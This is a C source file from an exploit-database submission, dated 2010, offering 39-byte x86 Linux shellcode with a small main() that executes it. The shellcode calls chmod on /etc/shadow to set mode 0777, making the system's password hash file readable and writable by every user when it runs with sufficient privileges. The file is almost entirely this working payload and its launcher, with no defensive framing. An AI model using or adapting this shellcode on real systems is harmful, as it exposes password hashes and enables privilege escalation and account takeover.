/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
/*
Title  : change mode 0777 of "/etc/shadow" with sys_chmod syscall
Name   : 39 bytes sys_chmod("/etc/shadow",599) x86 linux shellcode
Date   : jun, 1 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include <stdio.h>

char *shellcode=
 "\xeb\x15"                    /* jmp    0x8048077 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x0f"                    /* mov    $0xf,%al */
 "\x5b"                        /* pop    %ebx */
 "\x31\xc9"                    /* xor    %ecx,%ecx */
 "\x66\xb9\xff\x01"            /* mov    $0x1ff,%cx */
 "\xcd\x80"                    /* int    $0x80 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80"                    /* int    $0x80 */
 "\xe8\xe6\xff\xff\xff"        /* call   0x8048062 */
 "\x2f"                        /* das     */
 "\x65"                        /* gs */
 "\x74\x63"                    /* je     0x80480e3 */
 "\x2f"                        /* das     */
 "\x73\x68"                    /* jae    0x80480eb */
 "\x61"                        /* popa    */
 "\x64\x6f"                    /* outsl  %fs "(%esi),(%dx) */
 "\x77";                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}